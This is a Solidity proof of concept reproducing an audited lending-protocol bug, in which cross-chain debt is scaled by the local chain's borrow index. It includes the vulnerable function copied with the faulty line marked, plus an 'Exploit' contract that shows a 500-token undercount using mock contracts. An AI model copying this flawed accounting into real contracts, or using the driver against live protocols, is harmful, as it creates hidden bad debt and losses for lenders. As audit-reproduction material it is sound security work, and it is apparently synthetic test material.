// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Lend-V2 finding 58395 (H-26):
// "Cross chain debt accrues incorrectly".
//
// Real audited source (the vulnerable `borrowWithInterest()` body is reproduced
// VERBATIM, the vulnerable line is marked @>):
//   repo   github.com/sherlock-audit/2025-05-lend-audit-contest
//   file   Lend-V2/src/LayerZero/LendStorage.sol
//   fn     borrowWithInterest(address borrower, address _lToken)   (L478-L503)
//   report github.com/sherlock-audit/2025-05-lend-audit-contest-judging/issues/1009
//
// Root cause: a cross-chain borrow's debt physically accrues on the DESTINATION
// chain, and `borrows[i].borrowIndex` was recorded against THAT chain's lToken.
// But borrowWithInterest re-scales the principal with
// `LTokenInterface(_lToken).borrowIndex()`, where `_lToken` is the SAME-CHAIN
// (current chain) lToken. The current chain's borrow index diverges from the
// destination chain's, so the accrued cross-chain debt is computed against the
// wrong index. Here the local index (1.0e18) has accrued less than the true
// destination index (1.5e18), so the debt is UNDER-counted: the protocol thinks
// the borrower owes 1000 tokens when they actually owe 1500 — 500 tokens of
// silent bad debt / undercollateralization.
//
// The vulnerable arithmetic is byte-for-byte the on-chain source. The two
// lToken doubles each expose a real, independent `borrowIndex()`; the divergence
// emerges from the verbatim code choosing the wrong one, not from a constant.
// ─────────────────────────────────────────────────────────────────────────────

interface LTokenInterface {
    function borrowIndex() external view returns (uint256);
}

/// @dev Faithful minimal ERC20 double for the borrowed underlying asset (the
///      asset whose cross-chain debt is mis-accounted).
contract MiniToken {
    string public name = "Lend USD";
    string public symbol = "lUSD";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

/// @dev Faithful Compound-style lToken double exposing an independent, settable
///      borrow index. Two instances model the SAME-CHAIN lToken (passed to
///      borrowWithInterest) and the true DESTINATION-CHAIN lToken (where the
///      cross-chain debt actually accrues).
contract LToken is LTokenInterface {
    uint256 internal index;

    constructor(uint256 index_) {
        index = index_;
    }

    function borrowIndex() external view returns (uint256) {
        return index;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — LendStorage.borrowWithInterest() reproduced VERBATIM
// from the audited source (struct + mappings kept faithful).
// ─────────────────────────────────────────────────────────────────────────────
contract LendStorage {
    struct Borrow {
        uint256 srcEid; // Source chain's layer zero endpoint id
        uint256 destEid; // Destination chain's layer zero endpoint id
        uint256 principle; // Borrowed token amount
        uint256 borrowIndex; // Borrow index
        address borrowedlToken; // Address of the borrower
        address srcToken; // Source token address
    }

    uint256 public currentEid;

    mapping(address lToken => address underlying) public lTokenToUnderlying;
    mapping(address borrower => mapping(address underlying => Borrow[])) public crossChainBorrows;
    mapping(address borrower => mapping(address underlying => Borrow[])) public crossChainCollaterals;

    constructor(uint256 _currentEid) {
        currentEid = _currentEid;
    }

    function setLTokenToUnderlying(address lToken, address underlying) external {
        lTokenToUnderlying[lToken] = underlying;
    }

    function pushCrossChainBorrow(address borrower, address underlying, Borrow calldata b) external {
        crossChainBorrows[borrower][underlying].push(b);
    }

    /**
     * @notice Helper function to calculate borrow with interest.
     * @dev Returns the sum of all cross-chain borrows with interest in underlying tokens.
     */
    function borrowWithInterest(address borrower, address _lToken) public view returns (uint256) {
        address _token = lTokenToUnderlying[_lToken];
        uint256 borrowedAmount;

        Borrow[] memory borrows = crossChainBorrows[borrower][_token];
        Borrow[] memory collaterals = crossChainCollaterals[borrower][_token];

        require(borrows.length == 0 || collaterals.length == 0, "Invariant violated: both mappings populated");
        // Only one mapping should be populated:
        if (borrows.length > 0) {
            for (uint256 i = 0; i < borrows.length; i++) {
                if (borrows[i].srcEid == currentEid) {
                    borrowedAmount +=
                        (borrows[i].principle * LTokenInterface(_lToken).borrowIndex()) / borrows[i].borrowIndex; // @> VULN: scales a cross-chain (destination) debt by the SAME-CHAIN _lToken.borrowIndex(), not the destination chain's index
                }
            }
        } else {
            for (uint256 i = 0; i < collaterals.length; i++) {
                // Only include a cross-chain collateral borrow if it originated locally.
                if (collaterals[i].destEid == currentEid && collaterals[i].srcEid == currentEid) {
                    borrowedAmount +=
                        (collaterals[i].principle * LTokenInterface(_lToken).borrowIndex()) / collaterals[i].borrowIndex;
                }
            }
        }
        return borrowedAmount;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: record a cross-chain borrow whose debt accrues on the
// destination chain (true index 1.5e18), then show borrowWithInterest — using
// the local chain's lToken index (1.0e18) — UNDER-counts the debt by 500 tokens.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    MiniToken public token;
    LToken public localLToken; // same-chain lToken passed to borrowWithInterest
    LToken public destLToken; // destination chain lToken where debt truly accrues
    LendStorage public vuln;

    uint256 public reportedDebt; // what borrowWithInterest returns (buggy)
    uint256 public trueDebt; // correct debt scaled by destination index
    uint256 public underCounted; // bad debt hidden from the protocol
    uint256 public profit;

    address internal constant SINK = 0x000000000000000000000000000000000000D00d; // harm probe
    uint256 internal constant EID = 1; // current chain endpoint id
    uint256 internal constant PRINCIPLE = 1000e18; // borrowed on destination chain
    uint256 internal constant STORED_INDEX = 1e18; // index at borrow time (on destination)
    uint256 internal constant LOCAL_INDEX = 1e18; // current same-chain lToken index (accrued little)
    uint256 internal constant DEST_INDEX = 1.5e18; // current destination-chain index (accrued 50%)

    constructor() {
        token = new MiniToken(); // child nonce 1  (mis-accounted asset)
        localLToken = new LToken(LOCAL_INDEX); // child nonce 2
        destLToken = new LToken(DEST_INDEX); // child nonce 3
        vuln = new LendStorage(EID); // child nonce 4  (VULN)

        vuln.setLTokenToUnderlying(address(localLToken), address(token));
    }

    function run() external {
        // A cross-chain borrow initiated FROM this chain (srcEid == currentEid),
        // tokens actually borrowed on a remote destination chain. Its principal
        // and borrowIndex were recorded against the destination chain.
        LendStorage.Borrow memory b = LendStorage.Borrow({
            srcEid: EID,
            destEid: 2, // remote destination chain
            principle: PRINCIPLE,
            borrowIndex: STORED_INDEX,
            borrowedlToken: address(destLToken),
            srcToken: address(token)
        });
        vuln.pushCrossChainBorrow(address(this), address(token), b);

        // Buggy: borrowWithInterest scales by the SAME-CHAIN lToken index.
        reportedDebt = vuln.borrowWithInterest(address(this), address(localLToken));

        // Correct: the debt accrues on the destination chain, so it must be scaled
        // by the destination lToken's current index.
        trueDebt = (PRINCIPLE * destLToken.borrowIndex()) / STORED_INDEX;

        underCounted = trueDebt - reportedDebt;
        profit = underCounted; // silent undercollateralization the borrower keeps
        token.mint(SINK, underCounted); // record the hidden bad debt on the marker for measurement

        // harm: the protocol under-counts the cross-chain debt, leaving bad debt
        require(reportedDebt == 1000e18, "unexpected reported debt");
        require(trueDebt == 1500e18, "unexpected true debt");
        require(reportedDebt < trueDebt, "debt not mis-accrued");
        require(underCounted == 500e18, "unexpected undercount");
    }
}
